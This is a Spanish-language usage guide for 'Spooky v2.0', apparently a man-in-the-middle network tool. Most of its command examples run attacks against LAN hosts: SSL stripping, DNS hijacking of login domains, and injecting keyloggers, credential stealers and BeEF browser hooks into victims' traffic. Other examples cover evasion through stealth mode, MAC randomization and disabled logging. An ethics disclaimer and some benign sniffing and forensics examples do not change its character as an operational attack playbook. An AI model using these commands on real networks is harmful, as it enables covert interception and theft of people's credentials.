# 🕷️ Spooky v2.0 - Guía de Ejemplos de Uso

## Instalación Rápida
```bash
# Clonar y preparar
git clone <repo> spooky
cd spooky
sudo ./install.sh

# Verificar instalación
sudo python3 spooky.py --help
```

## 🎯 Ejemplos por Escenario

### 1. Auditoria Corporativa Básica
```bash
# Modo interactivo tradicional
sudo python3 spooky.py

# Auditoria sigilosa con dashboard
sudo python3 spooky.py --profile corporate --web-dashboard --stealth

# Solo credenciales, sin MITM activo
sudo python3 spooky.py --only-sniff --iface eth0 --web-dashboard
```

### 2. Red Team Operations
```bash
# Ataque completo con todas las funciones
sudo python3 spooky.py --profile red_team \
    --target 192.168.1.100 \
    --gateway 192.168.1.1 \
    --ssl-strip \
    --inject-payload credential_stealer \
    --randomize-mac \
    --stealth

# Ataque dirigido con DNS hijacking
sudo python3 spooky.py --profile red_team \
    --target 192.168.1.0/24 \
    --gateway 192.168.1.1 \
    --target-domains "login,auth,admin,secure" \
    --web-dashboard
```

### 3. Análisis de Red WiFi
```bash
# Auditoria WiFi completa
sudo python3 spooky.py --profile wifi_audit \
    --iface wlan0 \
    --ssl-strip \
    --web-dashboard \
    --ml-analysis

# Captura pasiva con análisis
sudo python3 spooky.py --only-sniff \
    --iface wlan0 \
    --bpf "not arp and not icmp" \
    --ml-analysis \
    --enable-osint
```

### 4. Análisis Forense
```bash
# Análisis profundo de tráfico
sudo python3 spooky.py --profile forensics \
    --only-sniff \
    --ml-analysis \
    --web-dashboard \
    --pcap /opt/spooky/pcaps/forensic_$(date +%Y%m%d).pcap

# Análisis de PCAP existente
sudo python3 spooky.py --dry-run \
    --ml-analysis \
    --pcap existing_capture.pcap
```

## 🔧 Ejemplos Avanzados

### Configuración de Payloads
```bash
# Keylogger en formularios web
sudo python3 spooky.py \
    --inject-payload keylogger \
    --target-domains "login,signin,auth" \
    --ssl-strip

# BeEF Hook para control del navegador
sudo python3 spooky.py \
    --inject-payload beef_hook \
    --target 192.168.1.100 \
    --gateway 192.168.1.1

# Credential stealer personalizado
sudo python3 spooky.py \
    --inject-payload credential_stealer \
    --web-dashboard \
    --timeout 7200
```

### Modo Stealth Avanzado
```bash
# Evasión máxima
sudo python3 spooky.py \
    --stealth \
    --randomize-mac \
    --interval 60.5 \
    --bpf "tcp port 80 or tcp port 443" \
    --max-pcap-size 50

# Anti-detección con intervalos aleatorios
sudo python3 spooky.py \
    --stealth \
    --interval 45.3 \
    --target 192.168.1.100 \
    --gateway 192.168.1.1 \
    --no-logging
```

### Integración con Herramientas Externas
```bash
# Con Responder externo
sudo python3 spooky.py \
    --profile corporate \
    --responder-restart-limit 5 \
    --log-auth \
    --auth-logfile /var/log/spooky/auth_events.log

# Con tcpdump para capturas pesadas
sudo python3 spooky.py \
    --use-tcpdump \
    --bpf "host 192.168.1.100 and port 80" \
    --max-pcap-size 200 \
    --web-dashboard
```

## 🌐 Usando el Dashboard Web

### Acceso Básico
```bash
# Iniciar con dashboard
sudo python3 spooky.py --web-dashboard

# Acceder desde navegador
firefox http://localhost:5000
```

### Dashboard en Puerto Personalizado
```bash
# Puerto específico
sudo python3 spooky.py --web-dashboard --dashboard-port 8080

# Con autenticación básica (futuro)
sudo python3 spooky.py --web-dashboard --auth-required
```

### API Endpoints
```bash
# Obtener estadísticas JSON
curl http://localhost:5000/api/stats

# Ejemplo de respuesta:
{
  "credentials": 15,
  "hosts": 8,
  "packets": 2543,
  "uptime": "0:15:32"
}
```

## 📊 Análisis y Reportes

### Generación de Reportes
```bash
# El reporte se genera automáticamente al finalizar
sudo python3 spooky.py --timeout 1800

# Archivos generados:
# - spooky_report.html (reporte visual)
# - spooky_session.json (datos estructurados)
# - spooky_capture.pcap (tráfico de red)
```

### Análisis Posterior
```bash
# Análizar PCAP existente
python3 -c "
from spooky import analyze_traffic_patterns
result = analyze_traffic_patterns('spooky_capture.pcap')
print(result)
"

# Ver datos de sesión
jq '.' spooky_session.json | head -50
```

## 🔍 Filtros BPF Útiles

### Filtros por Protocolo
```bash
# Solo HTTP/HTTPS
--bpf "tcp port 80 or tcp port 443"

# Solo tráfico DNS
--bpf "udp port 53"

# Solo tráfico de email
--bpf "tcp port 25 or tcp port 110 or tcp port 143"

# Excluir tráfico de gestión
--bpf "not arp and not icmp and not icmp6"
```

### Filtros por Host
```bash
# Tráfico específico de/hacia un host
--bpf "host 192.168.1.100"

# Múltiples hosts
--bpf "host 192.168.1.100 or host 192.168.1.101"

# Red específica
--bpf "net 192.168.1.0/24"

# Excluir gateway
--bpf "not host 192.168.1.1"
```

## 🛡️ Configuraciones de Seguridad

### Modo Laboratorio
```bash
# Solo en interfaces de laboratorio
sudo python3 spooky.py --iface vboxnet0

# Con archivo de consentimiento
sudo python3 spooky.py --require-consent-file /tmp/lab_consent.txt

# Timeout automático
sudo python3 spooky.py --timeout 3600 --profile corporate
```

### Logging Completo
```bash
# Logging detallado
sudo python3 spooky.py \
    --log-auth \
    --auth-logfile /var/log/spooky/auth.log \
    --logfile /var/log/spooky/session.log \
    --web-dashboard

# Rotación de logs
sudo python3 spooky.py \
    --max-pcap-size 100 \
    --max-pcap-files 10
```

## 🔌 Desarrollo de Plugins

### Plugin Personalizado
```python
# mi_plugin.py
from spooky import SpookyPlugin

class MiPlugin(SpookyPlugin):
    def __init__(self):
        super().__init__("MiPlugin", "Mi plugin personalizado")
    
    def execute(self, packet, session_data):
        if packet.haslayer('TCP'):
            # Tu lógica aquí
            self.log(f"TCP packet from {packet[IP].src}")

# Agregar al archivo principal
plugins.append(MiPlugin())
```

### Deshabilitar Plugins
```bash
# Deshabilitar plugins específicos
sudo python3 spooky.py \
    --disable-plugin OSINTIntegrator \
    --disable-plugin IPv6Handler

# Solo usar plugins básicos
sudo python3 spooky.py \
    --disable-plugin OSINTIntegrator \
    --disable-plugin AntiDetection \
    --disable-plugin PayloadInjector
```

## 🎭 Casos de Uso Específicos

### Honeypot Analysis
```bash
# Monitorear ataques entrantes
sudo python3 spooky.py --only-sniff \
    --bpf "dst port 22 or dst port 80 or dst port 443" \
    --web-dashboard \
    --ml-analysis
```

### Network Troubleshooting
```bash
# Diagnosticar problemas de red
sudo python3 spooky.py --only-sniff \
    --bpf "icmp or arp" \
    --timeout 300
```

### Compliance Auditing
```bash
# Verificar tráfico de cumplimiento
sudo python3 spooky.py --profile forensics \
    --only-sniff \
    --bpf "not (tcp port 22)" \
    --enable-osint
```

## 🚨 Consideraciones Éticas

### ⚠️ IMPORTANTE
```
SOLO usar en:
- Tus propias redes
- Laboratorios controlados  
- Con autorización EXPLÍCITA por escrito
- Fines educativos y de investigación

NUNCA usar en:
- Redes ajenas sin permiso
- Redes de producción sin autorización
- Con fines maliciosos
```

### Documentación Requerida
```bash
# Siempre documentar el uso
echo "$(date): Inicio de auditoria autorizada por [NOMBRE]" >> /var/log/spooky/usage.log

# Ejemplo de consentimiento
echo "AUTHORIZED_BY=John_Doe_$(date)" > /tmp/lab_consent.txt
sudo python3 spooky.py --require-consent-file /tmp/lab_consent.txt
```

## 🏁 Conclusión

Spooky v2.0 es ahora una herramienta profesional con capacidades que rivalizan con soluciones comerciales. Usa estas ejemplos como punto de partida y adapta según tus necesidades específicas.

**¡Recuerda siempre operar de forma ética y legal!** 🕷️

---

*Guía de uso desarrollada por Rubir0za - Spooky v2.0*
